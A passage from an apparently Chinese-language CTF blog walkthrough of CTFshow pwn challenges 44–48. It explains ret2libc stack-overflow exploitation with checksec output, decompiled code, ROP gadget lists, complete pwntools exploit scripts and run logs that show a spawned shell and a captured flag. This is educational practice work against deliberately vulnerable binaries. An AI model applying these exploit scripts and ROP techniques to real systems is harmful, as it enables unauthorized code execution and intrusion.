class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = cyclic(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) +</span><br><span class="line">p64(system)</span><br><span class="line">io.recvuntil(<span class="string">&quot;get system parameter!&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 333</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">/CTFshow_pwn/exp.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : This <span class="keyword">time</span> there is no replacement! How to <span class="keyword">do</span>?</span><br><span class="line">    * *************************************</span><br><span class="line">get system parameter!</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn</span><br></pre></td></tr></table></figure><h2 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h2><p>Hint：32位，无 system 无 “&#x2F;bin&#x2F;sh”</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位关闭栈保护关闭PIE</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;O.o?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xEu</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次发现下面有一个write函数，漏洞点还是在ctfshow函数，跟进查看一下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">103</span>]; <span class="comment">// [esp+Dh] [ebp-6Bh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是明显的溢出漏洞了，只是其中的偏移变了，大差不差，现在我们关心的是如何去找到我们所需要的东西呢？现在既没有system，也没有“&#x2F;bin&#x2F;sh”</p><ul><li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p></li><li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p></li></ul><p>如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于</strong> <strong>libc</strong> <strong>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的</p><p>地址。</p><p>我们大概了解了这个流程后，我们看到程序这次多出了一个write函数，那么我们就选用它来进行泄</p><p>露（使用其他的函数也可以，解题方法不唯一）</p><p>那么我们先列出一个大纲，去决定我们接下来怎么走：</p><ul><li><p>泄露write函数地址获取 libc 版本</p></li><li><p>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</p></li><li><p>再次执行源程序</p></li><li><p>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</p></li><li><p>再一步步来讲解我们的利用过程：</p></li></ul><ol><li><p>泄露libc版本</p><p>write函数的原型：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span>*buf,<span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure><p>fd:是文件描述符【<code>0</code> 表示标准输入，<code>1</code> 表示标准输出，<code>2</code> 表示标准错误】（write所对应的是写，即就是0） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数</p><p>首先填充(0x6b+4)个字节造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用 write函数，之后跟上main函数地址（重新执行程序，再次利用输入点来进行rop链构造），再设置 write函数；由此可以构造出payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic(0x6b+4)        # 填充缓冲区，覆盖到返回地址（0x6b是缓冲区大小，+4覆盖ebp）</span><br><span class="line">p32(write_plt)        # 覆盖返回地址为write函数的PLT地址（调用write）</span><br><span class="line">p32(main)             # write执行完后返回main函数（以便再次触发漏洞）</span><br><span class="line">p32(0)                # write的第一个参数：fd=0（标准输入）</span><br><span class="line">p32(write_got)        # write的第二个参数：buf=write函数在GOT表中的地址</span><br><span class="line">p32(4)                # write的第三个参数：count=4（读取4字节）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6b</span>+<span class="number">4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) <span class="comment"># 接收4字节地址</span></span><br><span class="line"><span class="comment">#print hex(write)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)  <span class="comment"># 计算libc加载基址</span></span><br></pre></td></tr></table></figure></li><li><p>算出程序的偏移量，计算system和bin&#x2F;sh的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>构造rop获取shell</p><p>payload &#x3D; cyclic(0x6b+4) + p32(system) + p32(main) + p32(bin_sh) #main可以是任意值0等</p></li></ol><p>大致流程如此，使用其他函数泄露遵循其他函数的原型，然后加上对应参数即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28202)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x6b</span>+<span class="number">4</span>) + p32(write_plt) + p32(main) +p32(<span class="number">4</span>)+p32(write_got) + p32(<span class="number">1</span>) <span class="comment">#write0,1都可以</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x6b</span>+<span class="number">4</span>) + p32(system) + p32(main) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28202: Done</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">/CTFshow_pwn/exp.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">/CTFshow_pwn/exp.py:13: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  write = u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-4:])</span><br><span class="line">0xf7df06f0</span><br><span class="line">[+] There are multiple libc that meet current constraints :</span><br><span class="line">0 - libc6_2.19-0ubuntu6_amd64</span><br><span class="line">1 - libc6_2.19-0ubuntu4_amd64</span><br><span class="line">2 - libc6_2.19-0ubuntu3_amd64</span><br><span class="line">3 - libc6_2.19-0ubuntu5_amd64</span><br><span class="line">4 - libc-2.36-22.mga9.x86_64</span><br><span class="line">5 - libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">6 - libc6_2.17-93ubuntu2_amd64</span><br><span class="line">7 - libc6-i386_2.27-3ubuntu1.3_amd64</span><br><span class="line">8 - libc6-i386_2.27-3ubuntu1.4_amd64</span><br><span class="line">9 - libc6_2.17-93ubuntu4_amd64</span><br><span class="line">[+] Choose one : 5</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">ctfshow&#123;3315b627-b11a-49c3-a8ba-894839004a7e&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h2><p>Hint：64位 无 system 无 “&#x2F;bin&#x2F;sh”</p><p>大致思路和上一题一样，不同的是64位的，前面也讲了它们的区别，大差不差</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop .*; ret&quot;</span></span><br><span class="line">0x00000000004005b6 : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005b5 : add byte ptr [rax], r8b ; pop rbp ; ret</span><br><span class="line">0x0000000000400617 : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400612 : mov byte ptr [rip + 0x201a4f], 1 ; pop rbp ; ret</span><br><span class="line">0x0000000000400677 : nop ; pop rbp ; ret</span><br><span class="line">0x00000000004005b3 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004005f5 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004007fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007fe : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400800 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400802 : pop r15 ; ret</span><br><span class="line">0x00000000004007fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007ff : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b8 : pop rbp ; ret</span><br><span class="line">0x0000000000400803 : pop rdi ; ret</span><br><span class="line">0x0000000000400801 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400615 : sbb ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400614 : sbb r12b, byte ptr [r8] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x0000000000400803 : pop rdi ; ret</span><br><span class="line">0x0000000000400801 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">在 x86-64 架构中，函数参数通过寄存器传递：</span><br><span class="line">rdi：第一个参数（文件描述符 fd）</span><br><span class="line">rsi：第二个参数（缓冲区地址 buf）</span><br><span class="line">rdx：第三个参数（写入字节数 count）</span><br><span class="line"></span><br><span class="line">write函数原型为：</span><br><span class="line">ssize_t write(int fd, const void *buf, size_t count);</span><br><span class="line"></span><br><span class="line">ROP 链中：</span><br><span class="line">p64(1)：通过pop rdi将文件描述符1（标准输出）放入rdi。</span><br><span class="line">p64(write_got)：通过pop rsi将write的 GOT 表地址放入rsi，这是我们要泄露的内容。</span><br><span class="line">p64(0)：通过pop r15将r15填充为 0（r15是多余参数，因为write只需要 3 个参数）。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400803</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x400801</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(write_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;O.o?&quot;</span>,payload)</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span>)  </span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span></span><br><span class="line"><span class="comment">#libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;O.o&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 175</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">0x7ffff7ebc560</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">?</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  </span><br></pre></td></tr></table></figure><h2 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h2><p>Hint：ez ret2libc</p><p>一个简单的ret2libc的应用，给出了很多函数的地址以及“&#x2F;bin&#x2F;sh”字符串的地址</p><p>先检查保护：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位程序关闭栈保护与PIE保护</p><p>IDA查看一下main函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give you some useful addr:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;puts: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fflush %p\n&quot;</span>, &amp;fflush);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;read: %p\n&quot;</span>, &amp;read);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;write: %p\n&quot;</span>, &amp;write);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift: %p\n&quot;</span>, useful);                 <span class="comment">// &quot;/bin/sh&quot;</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到输出了puts fflush read write 函数的地址，以及一个useful的地址，跟进查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0804B028                 public useful</span><br><span class="line">.data:0804B028 useful          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: main+AF↑o</span><br></pre></td></tr></table></figure><p>发现是“&#x2F;bin&#x2F;sh”的地址</p><p>运行程序尝试看一下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Ez ret2libc!</span><br><span class="line">    * *************************************</span><br><span class="line">Give you some useful addr:</span><br><span class="line"></span><br><span class="line">puts: 0xf7df2140</span><br><span class="line">fflush 0xf7defd10</span><br><span class="line"><span class="built_in">read</span>: 0xf7e909a0</span><br><span class="line">write: 0xf7e91b80</span><br><span class="line">gift: 0x804b028</span><br><span class="line"></span><br><span class="line">Start your show <span class="keyword">time</span>:</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rhea@rhea-VMware-Virtual-Platform:~/Desktop/CTFshow_pwn/libc-database$ ./find write 0xf7e91b80 puts 0xf7df2140</span><br><span class="line">ubuntu-glibc (libc6_2.39-0ubuntu8.4_i386)</span><br></pre></td></tr></table></figure><p>确实如此，跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">152</span>]; <span class="comment">// [esp+Ch] [ebp-9Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Start your show time: &quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧是栈溢出漏洞</p><p>而且直接给出了各个函数的地址，那么就更加简单了，这里我们通过泄露目标程序中 puts 函数的地址，并使用 LibcSearcher 类搜索 libc 版本和计算system函数的地址。又已知gift就是“&#x2F;bin&#x2F;sh”字符串的地址，将其也接收下来最后再进行getshell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;puts:&quot;</span>)</span><br><span class="line">puts=<span class="built_in">eval</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">bin_sh=<span class="built_in">eval</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="comment">#puts=0xf7df2140</span></span><br><span class="line"><span class="comment">#bin_sh=0x804b028</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span>)  </span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;puts&quot;,puts)</span></span><br><span class="line"><span class="comment">#libc_base=puts-libc.dump(&quot;puts&quot;)</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&quot;system&quot;)</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x9c</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里的我们详细分析这几行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;puts: &quot;</span>)</span><br><span class="line">puts = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span> , drop = <span class="literal">True</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">bin_sh = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span> , drop = <span class="literal">True</span>))</span><br></pre></td></tr></table></figure><p>发现跟之前写的exp有所不同，但是实际上得到的效果是一样的，按照之前的写法也没问题，这里</p><p>仅仅是为了演示多种不同的函数写法。</p><p>先使用 recvuntil 函数接收远程服务器发送的数据，直到遇到字符串 “puts: “ 。然后使用eval 函数执行接收到的字符串，将其解析为一个表达式并求值，得到 puts 函数的地址。类似地，下面这段代码接收数据，直到遇到字符串 “gift: “ 。然后使用 eval 函数执行接收到的字符串，得到一个地址，赋值给 bin_sh 变量。</p><p>其他的就应该没什么问题了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 333</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">Start your show <span class="keyword">time</span>:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\xa4\xdc\xf7</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn48"><a href="#pwn48" class="headerlink" title="pwn48"></a>pwn48</h2><p>Hint：没有write了，试试用puts吧，更简单了呢</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位关闭栈保护与PIE</p><p>还是IDA查看一下main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span 